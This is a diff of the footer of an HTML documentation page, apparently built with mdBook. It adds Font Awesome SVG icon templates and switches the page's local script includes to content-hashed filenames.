+        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
+        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
+        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
+        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>
 
         <!-- Livereload script (if served using the cli tool) -->
         <script>
@@ -1086,22 +1100,20 @@ Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture t
         </script>
 
 
-
         <script>
             window.playground_copyable = true;
         </script>
 
 
-        <script src="../../../elasticlunr.min.js"></script>
-        <script src="../../../mark.min.js"></script>
-        <script src="../../../searcher.js"></script>
+        <script src="../../../elasticlunr-ef4e11c1.min.js"></script>
+        <script src="../../../mark-09e88c2c.min.js"></script>
+        <script src="../../../searcher-c2a407aa.js"></script>
 
-        <script src="../../../clipboard.min.js"></script>
-        <script src="../../../highlight.js"></script>
-        <script src="../../../book.js"></script>
+        <script src="../../../clipboard-1626706a.min.js"></script>
+        <script src="../../../highlight-abc7f01d.js"></script>
+        <script src="../../../book-a0b12cfe.js"></script>
 
         <!-- Custom JS scripts -->
-        <script src="../../../theme/pagetoc.js"></script>
 
 
 
